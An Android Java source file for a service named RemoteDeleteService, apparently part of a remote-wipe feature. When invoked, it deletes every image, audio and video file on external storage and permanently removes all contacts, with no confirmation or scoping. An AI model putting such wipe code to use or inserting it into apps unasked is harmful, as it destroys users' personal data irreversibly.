package com.wpt.service;

import java.io.File;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.LightingColorFilter;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

public class RemoteDeleteService extends IntentService {

	private Uri uri;
	private Cursor c;
	private ContentResolver cr;
	private String path;
	private File file;

	public RemoteDeleteService() {
		super("RemoteDeleteService");
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		cr = getApplicationContext().getContentResolver();
		delImage();
		
		delAutio();
		
		delVideo();
		
		delContacts();
		
	}

	private void delImage() {
		uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
		c = cr.query(uri,
				new String[] { android.provider.MediaStore.Images.Media.DATA },
				null, null, null);
		for (int i = 0; i < c.getCount(); i++) {
			c.moveToPosition(i);
			path = c
					.getString(c
							.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA));
			file = new File(path);
			file.delete();
			Log.i("test", "Image");
			
		}
	}

	private void delAutio() {
		uri = android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
		c = cr.query(uri,
				new String[] { android.provider.MediaStore.Audio.Media.DATA },
				null, null, null);
		for (int i = 0; i < c.getCount(); i++) {
			c.moveToPosition(i);
			path = c
					.getString(c
							.getColumnIndexOrThrow(android.provider.MediaStore.Audio.Media.DATA));
			file = new File(path);
			file.delete();
			Log.i("test", "Autio");
		}
	}

	private void delVideo() {
		uri = android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
		c = cr.query(uri,
				new String[] { android.provider.MediaStore.Video.Media.DATA },
				null, null, null);
		for (int i = 0; i < c.getCount(); i++) {
			c.moveToPosition(i);
			path = c
			.getString(c
					.getColumnIndexOrThrow(android.provider.MediaStore.Video.Media.DATA));
			
			file = new File(path);
			file.delete();
			Log.i("test", "Video");
		}
	}

	private void delContacts() {
		uri = ContactsContract.RawContacts.CONTENT_URI.buildUpon()
				.appendQueryParameter(ContactsContract.CALLER_IS_SYNCADAPTER,
						"true").build();
		cr.delete(uri, null, null);
		Log.i("test", "Contacts");
	}
}
